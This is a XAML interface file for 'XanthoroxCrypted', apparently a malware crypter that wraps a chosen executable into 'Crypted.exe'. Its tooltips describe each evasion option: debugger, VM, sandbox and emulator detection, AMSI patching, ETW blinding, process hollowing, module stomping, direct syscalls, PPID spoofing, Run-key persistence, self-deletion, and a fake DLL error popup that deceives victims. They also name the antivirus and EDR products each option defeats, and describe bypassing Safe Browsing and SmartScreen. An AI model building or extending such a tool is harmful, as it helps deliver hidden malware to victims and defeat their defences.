<UserControl x:Class="XanthoroxCrypted.Views.BuilderView"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             mc:Ignorable="d" 
             d:DesignHeight="600" d:DesignWidth="820"
             ToolTipService.ShowDuration="15000">

    <ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled" Padding="24,20">
        <StackPanel MaxWidth="780">

            <!-- â•â•â• SECTION: PRESET PROFILE â•â•â• -->
            <Border Style="{StaticResource Style_Card}">
                <StackPanel>
                    <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
                        <TextBlock Text="ðŸŽ¯" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                        <TextBlock Text="PRESET PROFILE" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                    </StackPanel>
                    <ComboBox x:Name="CmbPreset" Style="{StaticResource Style_DarkCombo}" Height="34" SelectionChanged="CmbPreset_Changed">
                        <ComboBoxItem Content="ðŸ”§  Custom" IsSelected="True"/>
                        <ComboBoxItem Content="ðŸ”‡  Stealth"/>
                        <ComboBoxItem Content="ðŸ’€  Aggressive"/>
                        <ComboBoxItem Content="âš–ï¸  Balanced"/>
                    </ComboBox>
                </StackPanel>
            </Border>

            <!-- â•â•â• SECTION: PAYLOAD â•â•â• -->
            <Border Style="{StaticResource Style_Card}">
                <StackPanel>
                    <StackPanel Orientation="Horizontal" Margin="0,0,0,12">
                        <TextBlock Text="â—‰" Foreground="{StaticResource Brush_Cyan}" FontSize="14" Margin="0,0,8,0" VerticalAlignment="Center"/>
                        <TextBlock Text="PAYLOAD" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                    </StackPanel>

                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="3*"/>
                            <ColumnDefinition Width="12"/>
                            <ColumnDefinition Width="2*"/>
                        </Grid.ColumnDefinitions>

                        <StackPanel Grid.Column="0">
                            <TextBlock Text="Target Executable" Foreground="{StaticResource Brush_TextSecondary}" FontSize="11" Margin="0,0,0,6"/>
                            <Grid>
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="Auto"/>
                                </Grid.ColumnDefinitions>
                                <TextBox x:Name="TxtFilePath" Style="{StaticResource Style_DarkInput}" Height="34"/>
                                <Button Grid.Column="1" Content="â‹¯" Width="34" Height="34" Style="{StaticResource Style_BtnNeon}" Margin="6,0,0,0" Click="BtnBrowse_Click" Padding="0" FontSize="14"/>
                            </Grid>
                        </StackPanel>

                        <StackPanel Grid.Column="2">
                            <TextBlock Text="Output Filename" Foreground="{StaticResource Brush_TextSecondary}" FontSize="11" Margin="0,0,0,6"/>
                            <TextBox x:Name="TxtOutputName" Style="{StaticResource Style_DarkInput}" Height="34" Text="Crypted.exe"/>
                        </StackPanel>
                    </Grid>
                </StackPanel>
            </Border>

            <!-- â•â•â• SECTION: ENCRYPTION + OBFUSCATION â•â•â• -->
            <Border Style="{StaticResource Style_Card}">
                <StackPanel>
                    <StackPanel Orientation="Horizontal" Margin="0,0,0,12">
                        <TextBlock Text="ðŸ”" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                        <TextBlock Text="ENCRYPTION &amp; OBFUSCATION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                    </StackPanel>

                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*"/>
                            <ColumnDefinition Width="12"/>
                            <ColumnDefinition Width="*"/>
                        </Grid.ColumnDefinitions>

                        <StackPanel Grid.Column="0">
                            <TextBlock Text="Cipher" Foreground="{StaticResource Brush_TextSecondary}" FontSize="11" Margin="0,0,0,6"/>
                            <ComboBox x:Name="CmbEncryption" Style="{StaticResource Style_DarkCombo}" Height="34" SelectedIndex="0">
                                <ComboBoxItem Content="AES-256-GCM"/>
                                <ComboBoxItem Content="ChaCha20-Poly1305"/>
                                <ComboBoxItem Content="RC4 (Modified)"/>
                                <ComboBoxItem Content="XOR (Rolling Key)"/>
                            </ComboBox>
                        </StackPanel>

                        <StackPanel Grid.Column="2">
                            <TextBlock Text="Obfuscation Layer" Foreground="{StaticResource Brush_TextSecondary}" FontSize="11" Margin="0,0,0,6"/>
                            <ComboBox x:Name="CmbObfuscation" Style="{StaticResource Style_DarkCombo}" Height="34" SelectedIndex="0">
                                <ComboBoxItem Content="None"/>
                                <ComboBoxItem Content="IPv4 Encoding"/>
                                <ComboBoxItem Content="MAC Encoding"/>
                                <ComboBoxItem Content="Steganography (PNG)"/>
                            </ComboBox>
                        </StackPanel>
                    </Grid>
                </StackPanel>
            </Border>

            <!-- â•â•â• TWO-COLUMN: EVASION + EXECUTION â•â•â• -->
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="8"/>
                    <ColumnDefinition Width="*"/>
                </Grid.ColumnDefinitions>

                <!-- â”€â”€â”€ LEFT COLUMN: EVASION â”€â”€â”€ -->
                <Border Grid.Column="0" Style="{StaticResource Style_Card}">
                    <StackPanel>
                        <StackPanel Orientation="Horizontal" Margin="0,0,0,12">
                            <TextBlock Text="ðŸ›¡" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                            <TextBlock Text="EVASION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                        </StackPanel>

                        <CheckBox x:Name="ChkAntiDebug" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L1] Detects debuggers via PEB BeingDebugged flag, RDTSC timing, and NtQueryInformationProcess. Defeats x64dbg, WinDbg, OllyDbg.">
                            <TextBlock Text="Anti-Debug" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkAntiVM" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L2] Detects VMs by checking CPU core count, RAM size, disk size, and MAC OUI prefixes. Defeats VMware, VirtualBox, Hyper-V.">
                            <TextBlock Text="Anti-VM" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkAntiSandbox" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L3] Detects sandboxes by timing Sleep() calls â€” sandboxes fast-forward sleep. Defeats Any.Run, Joe Sandbox, Triage.">
                            <TextBlock Text="Anti-Sandbox" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkAntiEmulation" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L22] Detects AV emulators via 4 techniques: RDTSC timing delta, heap allocation validation, temp path existence, FLS support probing. Defeats Defender, Kaspersky, Norton, Bitdefender emulators.">
                            <TextBlock Text="Anti-Emulation" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>

                        <Rectangle Height="1" Fill="{StaticResource Brush_Border}" Margin="0,4,0,8"/>

                        <CheckBox x:Name="ChkAMSI" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L4] Patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN. Bypasses Windows Defender AMSI scanning for .NET and PowerShell payloads.">
                            <TextBlock Text="AMSI Patch" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkETW" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L5+L13] Patches both EtwEventWrite AND EtwEventWriteEx (Threat Intelligence provider). Blinds Defender ATP, CrowdStrike, and SentinelOne telemetry.">
                            <TextBlock Text="ETW Blinding" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>

                        <Rectangle Height="1" Fill="{StaticResource Brush_Border}" Margin="0,4,0,8"/>

                        <CheckBox x:Name="ChkSleepObf" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L7] Encrypts payload memory during 8-second sleep delay. Memory scanners can't find the decrypted payload while it sleeps. Defeats runtime memory scanning.">
                            <TextBlock Text="Sleep Obfuscation" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkPPIDSpoof" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L8] Spoofs parent process ID to explorer.exe. Child processes appear to be spawned by Windows Explorer instead of the stub. Defeats process tree analysis.">
                            <TextBlock Text="PPID Spoof" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkEntropyNorm" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L9] Applies affine cipher to redistribute byte values, lowering Shannon entropy from ~7.99 to ~6.5. Defeats entropy-based ML classifiers used by Defender and ESET.">
                            <TextBlock Text="Entropy Normalization" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>

                        <Rectangle Height="1" Fill="{StaticResource Brush_Border}" Margin="0,4,0,8"/>

                        <!-- POST-EXECUTION -->
                        <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
                            <TextBlock Text="ðŸ”¥" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                            <TextBlock Text="POST-EXECUTION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                        </StackPanel>

                        <CheckBox x:Name="ChkPersist" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L10] Adds HKCU\Software\Microsoft\Windows\CurrentVersion\Run key for automatic startup. No admin required. Survives reboots.">
                            <TextBlock Text="Startup Persist" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkMelt" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L10b] Self-destructs the original .exe after payload execution. Uses cmd.exe ping delay to delete. Removes forensic evidence from disk.">
                            <TextBlock Text="Melt File" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkFakeError" Style="{StaticResource Style_Toggle}" Margin="0,0,0,0"
                                  ToolTip="[L10c] Shows a fake 'MSVCP140.dll was not found' error dialog. Tricks the user into thinking the program crashed while payload runs silently in background.">
                            <TextBlock Text="Fake Error Popup" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                    </StackPanel>
                </Border>

                <!-- â”€â”€â”€ RIGHT COLUMN: EXECUTION â”€â”€â”€ -->
                <Border Grid.Column="2" Style="{StaticResource Style_Card}">
                    <StackPanel>
                        <StackPanel Orientation="Horizontal" Margin="0,0,0,12">
                            <TextBlock Text="âš¡" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                            <TextBlock Text="EXECUTION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                        </StackPanel>

                        <CheckBox x:Name="ChkFibers" Style="{StaticResource Style_Toggle}" IsChecked="True" Margin="0,0,0,8"
                                  ToolTip="[L6] Executes payload using Windows Fibers (ConvertThreadToFiber). Bypasses thread-based EDR monitoring from CrowdStrike, SentinelOne.">
                            <TextBlock Text="Fiber Injection" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkRunPE" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L6b] Process Hollowing â€” creates suspended svchost.exe, unmaps its memory, writes payload. Payload runs as a legitimate Windows process.">
                            <TextBlock Text="Process Hollowing" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkModuleStomp" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L6c] Module Stomping â€” loads a legitimate DLL, overwrites its .text section with payload. Payload runs from a signed module's memory region.">
                            <TextBlock Text="Module Stomping" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkSyscalls" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L11] Direct NT syscalls via Halo's Gate technique. Bypasses ALL EDR userland hooks by calling kernel directly. Defeats CrowdStrike, Sophos, Elastic.">
                            <TextBlock Text="Direct Syscalls" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkThreadPool" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L12] Executes payload via undocumented TpAllocWork/TpPostWork ntdll functions. Avoids CreateThread API monitoring by EDRs.">
                            <TextBlock Text="Thread Pool Exec" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkPhantomDLL" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L16] Phantom DLL Hollowing â€” loads a Microsoft-signed DLL, hollows its .text section, copies payload. Executes from within a signed module's address space.">
                            <TextBlock Text="Phantom DLL" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkCallbackDiv" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L16b] Callback Diversification â€” executes payload via EnumSystemLocalesA callback. Bypasses CreateThread and CreateRemoteThread monitoring.">
                            <TextBlock Text="Callback Diversify" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>

                        <Rectangle Height="1" Fill="{StaticResource Brush_Border}" Margin="0,4,0,8"/>

                        <!-- MEMORY PROTECTION -->
                        <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
                            <TextBlock Text="ðŸ”’" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                            <TextBlock Text="MEMORY PROTECTION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                        </StackPanel>

                        <CheckBox x:Name="ChkGuardPage" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L14] Wraps payload in PAGE_GUARD memory protection. If a memory scanner touches the guarded region, payload auto-re-encrypts itself. Defeats Defender runtime scanning.">
                            <TextBlock Text="Guard Page Shield" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkHWIDBind" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L15] Derives decryption key from target machine HWID (volume serial + computer name). Payload only decrypts correctly on the intended machine. Sandbox gets wrong key = corrupted payload.">
                            <TextBlock Text="HWID Key Bind" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                        <CheckBox x:Name="ChkStagedLoad" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                  ToolTip="[L39] Two-stage decryption: validates PE header first (wrong key = silent abort), then decrypts rest in 4KB chunks with 5ms micro-delays. Defeats emulators and memory scanners.">
                            <TextBlock Text="Staged Decrypt" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                        </CheckBox>
                    </StackPanel>
                </Border>
            </Grid>

            <!-- â•â•â• FULL-WIDTH: DOWNLOAD PROTECTION â•â•â• -->
            <Border Style="{StaticResource Style_Card}">
                <StackPanel>
                    <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
                        <TextBlock Text="ðŸŒ" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"/>
                        <TextBlock Text="DOWNLOAD PROTECTION" Style="{StaticResource Style_SectionLabel}" VerticalAlignment="Center" Margin="0"/>
                    </StackPanel>
                    <TextBlock Text="Bypasses Chrome Safe Browsing, Edge SmartScreen, and Windows Defender on-disk scans triggered during download."
                               Foreground="{StaticResource Brush_TextSecondary}" FontSize="10" Margin="0,0,0,12" TextWrapping="Wrap"/>

                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*"/>
                            <ColumnDefinition Width="16"/>
                            <ColumnDefinition Width="*"/>
                        </Grid.ColumnDefinitions>

                        <StackPanel Grid.Column="0">
                            <CheckBox x:Name="ChkMotwStrip" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                      ToolTip="[L21] Removes Zone.Identifier alternate data stream (Mark of the Web) on first run, then re-launches the executable clean. Bypasses Windows SmartScreen 'Unknown Publisher' warning that appears after Chrome/Edge download.">
                                <TextBlock Text="MOTW Strip" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                            </CheckBox>
                            <CheckBox x:Name="ChkOverlayMode" Style="{StaticResource Style_Toggle}" Margin="0,0,0,0"
                                      ToolTip="[L30] Moves encrypted payload to PE overlay (after last section) instead of a named .xthrx section. Section-based AV scanners and Chrome Safe Browsing hash checks won't find the payload.">
                                <TextBlock Text="Overlay Mode" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                            </CheckBox>
                        </StackPanel>

                        <StackPanel Grid.Column="2">
                            <CheckBox x:Name="ChkInflate" Style="{StaticResource Style_Toggle}" Margin="0,0,0,8"
                                      ToolTip="[L27] Pads binary to ~80MB with random-entropy data. Chrome Safe Browsing, SmartScreen, and Defender cloud sandboxes ALL skip files over ~50MB due to upload limits. Your payload stays its normal size â€” only the final .exe is inflated.">
                                <TextBlock Text="Binary Inflate (80MB)" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                            </CheckBox>
                            <CheckBox x:Name="ChkSectionMerge" Style="{StaticResource Style_Toggle}" Margin="0,0,0,0"
                                      ToolTip="[L33] Merges all PE sections (.text, .rdata, .data, etc.) into a single section. Defeats section-count heuristics and Defender's static section analysis. Makes the PE structure look minimal and clean.">
                                <TextBlock Text="Section Merge" Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"/>
                            </CheckBox>
                        </StackPanel>
                    </Grid>
                </StackPanel>
            </Border>

            <!-- â•â•â• SECTION: BUILD â•â•â• -->
            <Border Style="{StaticResource Style_Card}" Padding="16">
                <Grid>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>

                    <StackPanel VerticalAlignment="Center">
                        <TextBlock x:Name="LblStatus" Text="Ready. Select a payload to begin." Foreground="{StaticResource Brush_TextSecondary}" FontSize="12"/>
                    </StackPanel>

                    <Button Grid.Column="1" Content="âš¡  BUILD PAYLOAD" Height="40" Width="180" Style="{StaticResource Style_BtnPrimary}" Click="BtnBuild_Click"/>
                </Grid>
            </Border>

        </StackPanel>
    </ScrollViewer>
</UserControl>
